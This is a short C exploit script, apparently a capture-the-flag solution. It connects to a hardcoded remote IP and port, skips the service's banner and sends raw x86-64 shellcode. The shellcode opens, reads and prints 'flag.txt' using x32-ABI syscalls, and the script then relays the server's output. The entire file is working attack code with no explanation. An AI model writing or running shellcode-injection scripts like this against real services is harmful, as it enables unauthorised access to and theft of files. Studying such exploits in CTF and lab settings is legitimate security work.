#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int open_socket(char *ip, int port) {
    struct sockaddr_in sai;
    int sock;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sai.sin_addr.s_addr = inet_addr(ip);
    sai.sin_family = AF_INET;
    sai.sin_port = htons(port);

    connect(sock, (struct sockaddr *)&sai, sizeof(sai));
    return sock;
}

char sc[] =
        "\xe8\x09\x00\x00\x00\x66\x6c\x61\x67\x2e\x74\x78\x74\x00\x5f\x48\x31\xf6" \
        "\xb8\x02\x00\x00\x40\x0f\x05\x48\x89\xc7\x48\x83\xec\x40\x48\x8d\x34\x24" \
        "\xba\x40\x00\x00\x00\xb8\x00\x00\x00\x40\x0f\x05\xbf\x01\x00\x00\x00\x48" \
        "\x89\xc2\xb8\x01\x00\x00\x40\x0f\x05\xb8\x3c\x00\x00\x40\x48\x31\xff\x0f\x05";

int main(int argc, char **argv) {
    int sock = open_socket("104.238.153.45", 25887);
    int length = sizeof(sc);
    int x;
    char response[100];

    for (x = 0; x  < 7; x++) {
        response[0] = 0;
        while (read(sock, &response, 1) == 1)
            if (response[0] == '\n')
                break;
    }

    write(sock, &length, sizeof(length));
    write(sock, sc, sizeof(sc));
    while (1) {
        x = read(sock, response, 100);
        write(1, response, x);
    }   
}
